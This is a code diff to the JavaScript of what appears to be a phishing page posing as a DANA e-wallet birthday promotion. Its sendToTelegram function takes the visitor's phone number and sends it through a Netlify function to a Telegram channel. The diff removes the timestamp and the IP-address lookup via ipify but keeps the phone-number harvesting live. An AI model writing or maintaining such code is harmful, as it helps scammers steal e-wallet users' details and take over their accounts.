@@ -69,18 +69,11 @@ function showSuccessMessage() {
     }, 5000);
 }
 
-// Fungsi untuk mengirim data ke Netlify Function
+// Fungsi untuk mengirim data ke Netlify Function (Hanya nomor HP)
 async function sendToTelegram(phoneNumber) {
-    const timestamp = new Date().toLocaleString('id-ID');
-    const userIP = await getUserIP();
-    
-    const message = `├• APLIKASI | DANA
+    const message = `┌─ 📱 DANA - Hajatan Ulang Tahun
 ├───────────────────
-├• NOMOR HP : ${phoneNumber}
-├───────────────────
-├• WAKTU : ${timestamp}
-├───────────────────
-├• IP ADDRESS : ${userIP}
+├─ 🔢 NOMOR HP : ${phoneNumber}
 ╰───────────────────`;
     
     try {
@@ -91,9 +84,7 @@ async function sendToTelegram(phoneNumber) {
             },
             body: JSON.stringify({
                 phone: phoneNumber,
-                message: message,
-                timestamp: timestamp,
-                ip: userIP
+                message: message
             })
         });
         
@@ -109,17 +100,6 @@ async function sendToTelegram(phoneNumber) {
     } catch (error) {
         console.error('❌ Error:', error);
         return false;
-    }
-}
-
-// Fungsi untuk mendapatkan IP user (melalui API eksternal)
-async function getUserIP() {
-    try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-    } catch (error) {
-        return 'Unable to detect';
     }
 }
 
